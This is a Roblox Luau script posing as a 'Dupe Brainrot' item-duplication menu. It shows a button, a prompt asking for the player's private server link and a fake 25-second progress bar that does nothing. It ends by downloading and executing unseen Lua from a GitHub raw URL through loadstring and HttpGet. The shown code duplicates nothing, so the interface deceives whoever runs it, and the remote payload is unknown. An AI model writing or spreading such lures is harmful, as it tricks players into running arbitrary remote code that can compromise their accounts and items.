-- Services
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local GuiService = Player:WaitForChild("PlayerGui")

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DupeBrainrotGUI"
screenGui.Parent = GuiService

-- Button
local openButton = Instance.new("TextButton")
openButton.Size = UDim2.new(0,200,0,40)
openButton.Position = UDim2.new(0,10,0,10)
openButton.Text = "Open Menu Dupe Brainrot"
openButton.BackgroundColor3 = Color3.fromRGB(30,30,30)
openButton.TextColor3 = Color3.fromRGB(255,255,255)
openButton.Font = Enum.Font.GothamBold
openButton.TextSize = 18
openButton.Parent = screenGui

-- Progress Frame
local progressFrame = Instance.new("Frame")
progressFrame.Size = UDim2.new(0,300,0,20)
progressFrame.Position = UDim2.new(0.5,-150,0.2,0)
progressFrame.BackgroundColor3 = Color3.fromRGB(50,50,50)
progressFrame.Visible = false
progressFrame.Parent = screenGui

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0,0,1,0)
progressBar.BackgroundColor3 = Color3.fromRGB(0,255,0)
progressBar.Parent = progressFrame

local progressLabel = Instance.new("TextLabel")
progressLabel.Size = UDim2.new(1,0,1,0)
progressLabel.BackgroundTransparency = 1
progressLabel.TextColor3 = Color3.fromRGB(255,255,255)
progressLabel.Text = "0%"
progressLabel.Font = Enum.Font.GothamBold
progressLabel.TextSize = 14
progressLabel.Parent = progressFrame

-- Script logic
openButton.MouseButton1Click:Connect(function()
    openButton.Visible = false

    -- Hiển thị chữ nhỏ ở giữa màn phía trên 5s
    local infoLabel = Instance.new("TextLabel")
    infoLabel.Size = UDim2.new(0,400,0,30)
    infoLabel.Position = UDim2.new(0.5,-200,0.1,0)
    infoLabel.BackgroundTransparency = 1
    infoLabel.TextColor3 = Color3.fromRGB(255,255,255)
    infoLabel.Text = "Enter your private server link to dupe"
    infoLabel.Font = Enum.Font.Gotham
    infoLabel.TextSize = 18
    infoLabel.Parent = screenGui
    wait(5)
    infoLabel:Destroy()

    -- Hiển thị progress 25s
    progressFrame.Visible = true
    local duration = 25
    local steps = 100
    for i = 1, steps do
        progressBar.Size = UDim2.new(i/steps,0,1,0)
        progressLabel.Text = i.."%"
        wait(duration/steps)
    end
    progressFrame.Visible = false

    -- Load script Skbidi
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PhongYTB/Lavaca/refs/heads/main/Skbidi.lua"))()
end)
